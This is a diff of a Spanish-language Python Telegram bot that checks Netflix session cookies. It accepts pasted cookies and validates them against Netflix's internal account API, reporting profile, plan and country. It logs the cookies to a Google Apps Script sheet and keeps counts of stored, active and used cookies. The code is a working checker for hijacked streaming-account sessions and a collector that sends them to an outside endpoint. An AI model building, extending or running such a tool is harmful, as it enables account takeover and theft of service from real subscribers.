@@ -42,18 +42,18 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def check_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
     raw_text = update.message.text.strip()
-    
+
     # Limpiar posibles saltos de línea extraños
     cleaned_text = raw_text.replace('\r', '').replace('\n', ' ')
-    
+
     logger.info(f"Recibida cookie: {cleaned_text[:50]}...")
-    
+
     await update.message.reply_text("⏳ Verificando cookie... Por favor espera.")
 
     try:
         # Paso 1: Obtener nftoken
         nftoken = get_nftoken()
-        
+
         if not nftoken:
             await update.message.reply_text("❌ Error al generar el token de sesión.")
             return
@@ -68,12 +68,12 @@ async def check_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status = result.get('status', 'Desconocido')
         profile = result.get('profileName', 'No disponible')
         plan = result.get('localizedPlanName', 'No disponible')
-        
+
         message = f"✅ ¡Cookie Activa!\n\n"
         message += f"👤 Perfil: {profile}\n"
         message += f"💳 Plan: {plan}\n"
         message += f"🔒 Estado: {status}"
-        
+
         await update.message.reply_text(message)
 
     except Exception as e:
@@ -85,15 +85,15 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         response = requests.get(GOOGLE_SCRIPT_URL + "?action=stats", timeout=5)
         data = response.json()
-        
+
         total = data.get('total', 0)
         active = data.get('active', 0)
-        
+
         msg = f"📊 *Estadísticas del Bot:*\n\n"
         msg += f"Total guardadas: {total}\n"
         msg += f"Cookies activas: {active}\n"
         msg += f"Usadas: {total - active}"
-        
+
         await update.message.reply_text(msg, parse_mode='Markdown')
     except Exception as e:
         await update.message.reply_text(f"❌ No se pudieron cargar las estadísticas: {str(e)}")
@@ -118,18 +118,18 @@ def verify_cookie(cookie, nftoken):
     url = f"https://www.netflix.com/api/shakti/me?locale=en-US&nftoken={nftoken}"
     headers = HEADERS.copy()
     headers['cookie'] = cookie
-    
+
     try:
         resp = requests.get(url, headers=headers, timeout=15)
         if resp.status_code == 200:
             data = resp.json()
             profiles = data.get('profiles', [])
             account_info = data.get('account', {})
-            
+
             profile_name = profiles[0]['name'] if profiles else 'Sin perfil'
             plan = account_info.get('currentProfile', {}).get('profileLevel', 'N/A')
             country = account_info.get('country', 'N/A')
-            
+
             return {
                 'status': 'Active',
                 'profileName': profile_name,
@@ -145,19 +145,20 @@ def verify_cookie(cookie, nftoken):
 def save_to_sheets(data):
     """Guarda los datos en Google Sheets vía Apps Script"""
     try:
-        payload = {'data': data}
+        # Asegurarse de que el payload sea una lista de filas
+        payload = [data]
         requests.post(GOOGLE_SCRIPT_URL, json=payload, timeout=10)
     except Exception as e:
         logger.error(f"Fallo al guardar en sheets: {e}")
 
 if __name__ == '__main__':
     application = ApplicationBuilder().token(BOT_TOKEN).build()
-    
+
     # Handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("stats", stats_command))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_cookie))
-    
+
     logger.info("Bot iniciado en Español 🇪🇸")
     application.run_polling()
